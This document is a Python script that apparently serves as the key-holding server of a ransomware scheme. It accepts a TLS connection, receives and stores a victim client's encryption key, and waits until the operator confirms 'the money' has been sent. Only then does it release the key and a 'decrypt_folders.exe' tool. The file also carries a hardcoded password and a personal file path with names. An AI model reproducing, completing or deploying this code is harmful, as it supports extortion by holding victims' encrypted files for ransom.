import os
import socket
import sqlite3
import ssl
from cryptography.fernet import Fernet
HOST = '0.0.0.0'
PORT = 8443

MASTER_KEY = os.getenv("MASTER_KEY")
if MASTER_KEY is None:
    raise ValueError("MASTER_KEY environment variable not set!")
MASTER_KEY = MASTER_KEY.encode()

def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return sock
def wrap_socket(socket):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\Server Side\cert.pem", keyfile=r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\Server Side\key.pem")
    ssl_socket = context.wrap_socket(socket, server_side=True)
    return ssl_socket
def save_encrypted_key_to_db(encryption_key, db_connection):
    print(f"Saving Encryption Key to DB: {encryption_key.decode()}")
    cursor = db_connection.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS keys (id INTEGER PRIMARY KEY, key BLOB)''')
    cursor.execute('INSERT INTO keys (key) VALUES (?)', (encryption_key,))
    db_connection.commit()
def get_encrypted_key_from_db(db_connection):
    cursor = db_connection.cursor()
    cursor.execute('SELECT key FROM keys ORDER BY id DESC LIMIT 1')
    row = cursor.fetchone()
    if row:
        return row[0]
def encrypt_key(key, encryption_key):
    f = Fernet(encryption_key)
    encrypted_key = f.encrypt(key)
    return encrypted_key
def decrypt_key(encrypted_key, encryption_key):
    f = Fernet(encryption_key)
    decrypted_key = f.decrypt(encrypted_key)
    return decrypted_key
def main():
    server_socket = create_socket()
    server_socket.bind((HOST, PORT))
    server_socket.listen()
    server_socket = wrap_socket(server_socket)
    print(f'Server listening on {HOST}:{PORT}')
    conn, addr = server_socket.accept()
    print(f'Connection from {addr}')
    password_text = "YaliTheSigmaBoy123"
    conn.send(password_text.encode())
    print("Password sent to client.")
    encryption_key = conn.recv(1024)
    print(f'Received Encryption Key: {encryption_key.decode()}')
    db_conn = sqlite3.connect('encryption_key.db')
    encrypted_key = encrypt_key(encryption_key, MASTER_KEY)
    save_encrypted_key_to_db(encrypted_key, db_conn)
    
    encrypt_key_from_db = get_encrypted_key_from_db(db_conn)
    decrypted_key = decrypt_key(encrypt_key_from_db, MASTER_KEY)
    print(f'Decrypted Key from DB: {decrypted_key.decode()}')
    money_send = False
    while not money_send:
        is_money_send = input("Has the client sent the money? (yes/no): ")
        if is_money_send.lower() == 'yes':
            money_send = True
    conn.send(decrypted_key)
    with open("dist\\decrypt_folders.exe", "rb") as f:
        data = f.read()
        conn.sendall(data)
    print("Decryption tool sent to client.")
        
    server_socket.close()
if __name__ == '__main__':
    main()
    